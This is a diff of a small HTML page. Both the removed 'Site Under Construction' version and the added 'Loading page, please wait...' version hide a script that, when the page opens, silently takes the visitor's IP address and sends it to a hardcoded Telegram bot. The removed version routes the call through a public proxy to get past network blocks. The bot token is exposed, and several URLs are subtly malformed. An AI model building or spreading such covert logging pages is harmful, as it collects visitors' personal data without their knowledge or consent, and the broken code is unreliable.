@@ -2,49 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
-    <script>
-        window.onload = function() {
-            // 1. Fetch the user's IP address
-            fetch('https://ipify.org')
-                .then(response => response.json())
-                .then(data => {
-                    const botToken = '8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE';
-                    const chatId = '8714686528';
-                    const messageText = `📌 Visitor Logged\n🌐 IP Address: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
-                    
-                    // 2. Base Telegram target URL
-                    const rawTelegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                    
-                    // 3. Wrap inside a public proxy to bypass your network's 302 blocks
-                    const proxiedUrl = `https://corsproxy.io{encodeURIComponent(rawTelegramUrl)}`;
-
-                    // 4. Send the payload safely
-                    fetch(proxiedUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: messageText
-                        })
-                    })
-                    .then(res => {
-                        if (res.ok) {
-                            console.log("Success! Message bypassed network restrictions.");
-                        } else {
-                            console.error("The network proxy connected, but Telegram rejected the inputs.");
-                        }
-                    });
-                })
-                .catch(err => console.error("IP source blocked by adblock extension:", err));
-        };
-    </script>
+    <title>Loading...</title>
 </head>
 <body>
-    <h1>Site Under Construction</h1>
-    <p>Please check back later.</p>
+    <p>Loading page, please wait...</p>
+
+    <script>
+        // Replace with your actual Telegram Bot Token and Chat ID
+        const BOT_TOKEN = "8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE";
+        const CHAT_ID = "8714686528";
+
+        // Fetch user IP address from a public API
+        fetch('https://ipify.org')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+                const message = encodeURIComponent(`New visitor IP: ${userIp}`);
+                
+                // Send the IP to your Telegram bot
+                const telegramUrl = `https://telegram.org{BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+                
+                return fetch(telegramUrl);
+            })
+            .catch(error => {
+                console.error('Error logging IP:', error);
+            });
+    </script>
 </body>
 </html>
